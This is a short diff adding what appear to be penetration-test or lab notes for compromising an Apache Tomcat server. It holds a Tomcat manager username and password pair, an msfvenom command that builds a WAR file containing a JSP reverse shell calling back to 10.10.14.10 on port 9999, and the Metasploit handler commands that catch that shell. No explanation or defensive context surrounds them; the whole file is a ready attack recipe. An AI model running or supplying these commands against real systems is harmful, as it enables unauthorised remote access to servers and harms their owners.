@@ -1,0 +1,9 @@
+creds " tomcat | Tomcatadm "
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f war -o rshell.war
+exploit/multi/handler
+show options
+set payload java/jsp_shell_reverse_tcp
+set LHOST 10.10.14.10
+set LPORT 9999
+exploit
